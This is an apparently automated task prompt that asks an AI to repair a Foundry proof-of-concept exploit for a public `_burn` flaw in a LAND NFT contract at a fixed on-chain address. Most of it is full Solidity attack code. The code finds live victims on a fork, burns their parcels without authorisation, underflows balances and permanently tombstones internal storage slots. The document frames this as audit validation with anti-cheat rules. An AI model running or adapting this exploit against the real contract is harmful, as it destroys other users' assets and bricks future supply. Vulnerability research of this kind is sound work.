You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public `_burn` lets anyone destroy arbitrary LAND and corrupt balances
- claim: `_burn` is declared `public` and only checks the caller-supplied `from` and `owner` arguments for equality. It never verifies `msg.sender`, token existence, or that `owner` matches the real owner resolved by `_ownerOf`/`_ownerAndOperatorEnabledOf`. Any external account can therefore call `_burn(victim, victim, id)` and overwrite arbitrary `_owners[id]` slots with the burn sentinel while decrementing any chosen address balance.
- impact: An attacker can permissionlessly burn live LAND parcels belonging to other users, permanently tombstone unminted 1x1 ids or internal quad-layer storage slots so they can never be minted/regrouped, and underflow arbitrary `_numNFTPerAddress` balances by burning nonexistent ids. This can destroy user assets, brick future supply, and corrupt accounting.
- exploit_paths: ["Call `_burn(alice, alice, childId)` for a live LAND tile owned by Alice; the function sets `_owners[childId] = 2**160` and decrements Alice's balance without any authorization check.", "Call `_burn(target, target, nonexistentId)`; because there is no existence check, `_numNFTPerAddress[target]--` executes and can underflow if the target balance is too small.", "Call `_burn(victim, victim, LAYER_3x3/6x6/12x12/24x24 + baseId)` to tombstone internal quad slots, causing future mint/regroup logic that expects zeroed storage to fail permanently."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.17;

interface ILand {
    function _burn(address from, address owner, uint256 id) external;
    function _owners(uint256 id) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 id) external view returns (address);
}

contract FlawVerifier {
    address internal constant TARGET = 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a;

    uint256 internal constant GRID_SIZE = 408;
    uint256 internal constant MAX_1X1_ID = GRID_SIZE * GRID_SIZE;

    uint256 internal constant LAYER_3X3 = 0x0100000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_6X6 = 0x0200000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_12X12 = 0x0300000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_24X24 = 0x0400000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant BURN_SENTINEL = uint256(1) << 160;

    bool public executed;
    bool public hypothesisValidated;

    address public liveVictim;
    uint256 public liveChildId;
    uint256 public victimBalanceBeforeLiveBurn;
    uint256 public victimBalanceAfterLiveBurn;

    uint256 public nonexistentId;
    uint256 public attackerBalanceBeforeUnderflow;
    uint256 public attackerBalanceAfterUnderflow;

    uint256 public internalSlotId;
    uint256 public victimBalanceBeforeSlotBurn;
    uint256 public victimBalanceAfterSlotBurn;

    string public failureReason;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        ILand land = ILand(TARGET);

        (bool foundLivePath, address victim, uint256 childId, uint256 slotId) = _findPrimaryExploitPath(land);
        if (!foundLivePath) {
            failureReason = "No live LAND + internal slot candidate found on fork";
            return;
        }

        liveVictim = victim;
        liveChildId = childId;
        internalSlotId = slotId;

        uint256 chosenNonexistentId = _findNonexistent1x1(land);
        if (chosenNonexistentId == type(uint256).max) {
            failureReason = "No nonexistent 1x1 LAND found on fork";
            return;
        }
        nonexistentId = chosenNonexistentId;

        victimBalanceBeforeLiveBurn = land.balanceOf(victim);
        if (victimBalanceBeforeLiveBurn == 0) {
            failureReason = "Chosen victim has zero LAND balance";
            return;
        }

        (bool childExistsBefore, address childOwnerBefore) = _tryOwnerOf(land, childId);
        if (!childExistsBefore || childOwnerBefore != victim) {
            failureReason = "Chosen live child is not owned by victim at execution time";
            return;
        }

        land._burn(victim, victim, childId);

        victimBalanceAfterLiveBurn = land.balanceOf(victim);
        if (land._owners(childId) != BURN_SENTINEL) {
            failureReason = "Live child burn did not write burn sentinel";
            return;
        }
        if (victimBalanceAfterLiveBurn + 1 != victimBalanceBeforeLiveBurn) {
            failureReason = "Live child burn did not decrement victim balance";
            return;
        }
        (bool childExistsAfter,) = _tryOwnerOf(land, childId);
        if (childExistsAfter) {
            failureReason = "Live child still resolves as existing after burn";
            return;
        }

        attackerBalanceBeforeUnderflow = land.balanceOf(address(this));
        if (attackerBalanceBeforeUnderflow != 0) {
            failureReason = "Verifier unexpectedly already owns LAND";
            return;
        }

        land._burn(address(this), address(this), nonexistentId);

        attackerBalanceAfterUnderflow = land.balanceOf(address(this));
        if (land._owners(nonexistentId) != BURN_SENTINEL) {
            failureReason = "Nonexistent burn did not write burn sentinel";
            return;
        }
        if (attackerBalanceAfterUnderflow != type(uint256).max) {
            failureReason = "Nonexistent burn did not underflow verifier balance";
            return;
        }

        if (land._owners(slotId) != 0) {
            failureReason = "Chosen internal quad slot is no longer zero";
            return;
        }

        victimBalanceBeforeSlotBurn = land.balanceOf(victim);
        if (victimBalanceBeforeSlotBurn == 0) {
            failureReason = "Victim balance exhausted before internal slot burn";
            return;
        }

        land._burn(victim, victim, slotId);

        victimBalanceAfterSlotBurn = land.balanceOf(victim);
        if (land._owners(slotId) != BURN_SENTINEL) {
            failureReason = "Internal slot burn did not write burn sentinel";
            return;
        }
        if (victimBalanceAfterSlotBurn + 1 != victimBalanceBeforeSlotBurn) {
            failureReason = "Internal slot burn did not decrement victim balance";
            return;
        }

        hypothesisValidated = true;

        // Profit is intentionally left at zero.
        // This PoC validates the destructive/public-burn root cause and the three path stages,
        // but no direct positive-value extraction route is exposed by these public actions alone
        // at the specified fork state without changing the exploit causality.
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external pure returns (uint256) {
        return 0;
    }

    function _findPrimaryExploitPath(ILand land)
        internal
        view
        returns (bool found, address victim, uint256 childId, uint256 slotId)
    {
        (found, victim, childId, slotId) = _scanParentLayer(land, LAYER_24X24, 24);
        if (found) return (found, victim, childId, slotId);

        (found, victim, childId, slotId) = _scanParentLayer(land, LAYER_12X12, 12);
        if (found) return (found, victim, childId, slotId);

        (found, victim, childId, slotId) = _scanParentLayer(land, LAYER_6X6, 6);
        if (found) return (found, victim, childId, slotId);

        (found, victim, childId, slotId) = _scanParentLayer(land, LAYER_3X3, 3);
        if (found) return (found, victim, childId, slotId);
    }

    function _scanParentLayer(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, address victim, uint256 childId, uint256 slotId)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 rawOwner = land._owners(layer + baseId);
                if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                    continue;
                }

                // forge-lint: disable-next-line(unsafe-typecast)
                victim = address(uint160(rawOwner));
                if (victim == address(0)) {
                    continue;
                }

                childId = baseId;

                if (size >= 6) {
                    slotId = _findZero3x3Within(land, x, y, size);
                    if (slotId != type(uint256).max) {
                        return (true, victim, childId, slotId);
                    }
                }

                slotId = _findAnyZeroInternalSlot(land);
                if (slotId != type(uint256).max) {
                    return (true, victim, childId, slotId);
                }
            }
        }
    }

    function _findZero3x3Within(ILand land, uint256 startX, uint256 startY, uint256 parentSize)
        internal
        view
        returns (uint256)
    {
        for (uint256 y = startY; y < startY + parentSize; y += 3) {
            for (uint256 x = startX; x < startX + parentSize; x += 3) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 slotId = LAYER_3X3 + baseId;
                if (land._owners(slotId) == 0) {
                    return slotId;
                }
            }
        }
        return type(uint256).max;
    }

    function _findAnyZeroInternalSlot(ILand land) internal view returns (uint256) {
        uint256 slotId = _scanZeroInternalLayer(land, LAYER_3X3, 3);
        if (slotId != type(uint256).max) return slotId;

        slotId = _scanZeroInternalLayer(land, LAYER_6X6, 6);
        if (slotId != type(uint256).max) return slotId;

        slotId = _scanZeroInternalLayer(land, LAYER_12X12, 12);
        if (slotId != type(uint256).max) return slotId;

        return _scanZeroInternalLayer(land, LAYER_24X24, 24);
    }

    function _scanZeroInternalLayer(ILand land, uint256 layer, uint256 size) internal view returns (uint256) {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 slotId = layer + baseId;
                if (land._owners(slotId) == 0) {
                    return slotId;
                }
            }
        }
        return type(uint256).max;
    }

    function _findNonexistent1x1(ILand land) internal view returns (uint256) {
        for (uint256 y = 0; y < GRID_SIZE; y += 24) {
            for (uint256 x = 0; x < GRID_SIZE; x += 24) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 12) {
            for (uint256 x = 0; x < GRID_SIZE; x += 12) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 6) {
            for (uint256 x = 0; x < GRID_SIZE; x += 6) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 3) {
            for (uint256 x = 0; x < GRID_SIZE; x += 3) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            (bool exists,) = _tryOwnerOf(land, id);
            if (!exists) {
                return id;
            }
        }

        return type(uint256).max;
    }

    function _tryOwnerOf(ILand land, uint256 id) internal view returns (bool exists, address owner) {
        (bool ok, bytes memory data) = address(land).staticcall(
            abi.encodeWithSelector(ILand.ownerOf.selector, id)
        );
        if (!ok || data.length < 32) {
            return (false, address(0));
        }
        owner = abi.decode(data, (address));
        exists = owner != address(0);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0, 1, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
